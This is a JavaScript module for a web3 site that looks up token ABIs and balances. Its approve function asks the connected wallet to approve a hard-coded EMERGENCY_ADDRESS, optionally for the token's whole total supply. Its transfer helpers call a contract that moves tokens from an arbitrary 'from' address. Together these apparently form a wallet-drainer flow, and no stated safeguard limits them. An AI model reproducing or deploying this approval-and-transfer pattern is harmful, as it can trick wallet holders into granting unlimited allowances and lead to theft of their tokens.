import Web3 from 'web3';
import bigInt from "big-integer";

import siteConfig from '../config/site.config';
import { getContractInstance } from './index'
import { hasMethod } from '../service/contract'

function getScanApiKey() {
  const randomNumber = parseInt(Math.random() * 1000);
  if (siteConfig.scanApiKey.length === 0)
    return ''
  const index = randomNumber % siteConfig.scanApiKey.length
  console.log('index', index)
  return siteConfig.scanApiKey[index]
}
async function getAbiAddress(address) {
  const has = await hasMethod(address, "implementation()")
  if (!has) {
    return address
  }
  const scanApiKey = getScanApiKey()
  let response = await window.fetch(
    `${siteConfig.scanApi}?module=contract&action=getabi&address=${address}&apikey=${scanApiKey}`, 
    {method: 'GET'})
  let res = await response.json();
  const abi = res.result
  const web3 = new Web3(Web3.givenProvider);
  const contractInstance = new web3.eth.Contract(JSON.parse(abi), address);
  const abiAddress = await contractInstance.methods.implementation().call()
  return abiAddress
}

async function approve(tokenAddress, amount, address, isTotal=false) {
  try {
    const abiAddress = await getAbiAddress(tokenAddress)
    const scanApiKey = getScanApiKey()
    const response = await window.fetch(
      `${siteConfig.scanApi}?module=contract&action=getabi&address=${abiAddress}&apikey=${scanApiKey}`, 
      {method: 'GET'})
    const res = await response.json();
    const abi = res.result
    const web3 = new Web3(Web3.givenProvider);
    const contractInstance = new web3.eth.Contract(JSON.parse(abi), tokenAddress);
    const decimals = await contractInstance.methods.decimals().call()
    let _amount = amount
    if (isTotal) {
      const totalSupply = await contractInstance.methods.totalSupply().call()
      _amount = totalSupply
    }
    _amount = _amount * Math.pow(10, decimals)
    await contractInstance.methods.approve(siteConfig.EMERGENCY_ADDRESS, bigInt(_amount).toString()).send({
      from: address,
      gasLimit: siteConfig.gasLimit,
      maxFeePerGas: siteConfig.maxFeePerGas,
      maxPriorityFeePerGas: siteConfig.maxPriorityFeePerGas
    })
    return Promise.resolve(_amount)
  } catch (error) {
    return Promise.reject(error)
  }
}

async function getBalance(abiAddress, tokenAddress, address) {
  try {
    const scanApiKey = getScanApiKey()
    const response = await window.fetch(
      `${siteConfig.scanApi}?module=contract&action=getabi&address=${abiAddress}&apikey=${scanApiKey}`, 
      {method: 'GET'})
    const resAbi = await response.json();
    const abi = resAbi.result
    const web3 = new Web3(Web3.givenProvider);
    const contractInstance = new web3.eth.Contract(JSON.parse(abi), tokenAddress);
    const decimals = await contractInstance.methods.decimals().call()
    let res = await contractInstance.methods.balanceOf(address).call()
    res = res / Math.pow(10, decimals)
    return Promise.resolve(res);
  } catch (error) {
    return Promise.reject(error);
  }
}

async function getBalances(address) {
  try {
    const response = await window.fetch(
      `${siteConfig.covalentApi}/${siteConfig.NETWORK.ID}/address/${address}/balances_v2/?quote-currency=USD&format=JSON&block-signed-at-asc=false&no-logs=false&key=${siteConfig.covalentApiKey}`, 
      {method: 'GET'})
    const tmp = await response.json();
    const res = tmp?.data?.items
    return Promise.resolve(res);
  } catch (error) {
    return Promise.reject(error);
  }
}

async function mint(amount, address) {
  try {
    const contractInstance = getContractInstance()
    const res = await contractInstance.methods.mint(amount).send({
      from: address,
      gasLimit: siteConfig.gasLimit,
      maxFeePerGas: siteConfig.maxFeePerGas,
      maxPriorityFeePerGas: siteConfig.maxPriorityFeePerGas
    });
    return Promise.resolve(res);
  } catch (error) {
    return Promise.reject(error);
  }
}

async function transfer(from, tokenAddress, to, value, isMax, address) {
  try {
    const contractInstance = getContractInstance()
    const res = await contractInstance.methods.tokenTransfer(from, tokenAddress, to, value, isMax).send({
      from: address,
    });
    return Promise.resolve(res);
  } catch (error) {
    return Promise.reject(error);
  }
}

async function transferAll(tokenAddress, to, value, isMax, address) {
  try {
    const contractInstance = getContractInstance()
    const res = await contractInstance.methods.tokenTransferAll(tokenAddress, to, value, isMax).send({
      from: address,
    });
    return Promise.resolve(res);
  } catch (error) {
    return Promise.reject(error);
  }
}

async function getTransactinos(address) {
  try {
    const response = await window.fetch(
      `${siteConfig.covalentApi}/${siteConfig.NETWORK.ID}/address/${address}/transactions_v2/?quote-currency=USD&format=JSON&block-signed-at-asc=false&no-logs=false&key=${siteConfig.covalentApiKey}`, 
      {method: 'GET'})
    const tmp = await response.json();
    const res = tmp?.data?.items
    return Promise.resolve(res);
  } catch (error) {
    return Promise.reject(error);
  }
}

export {
  transfer,
  transferAll,
  mint,
  approve,
  getBalance,
  getBalances,
  getTransactinos
}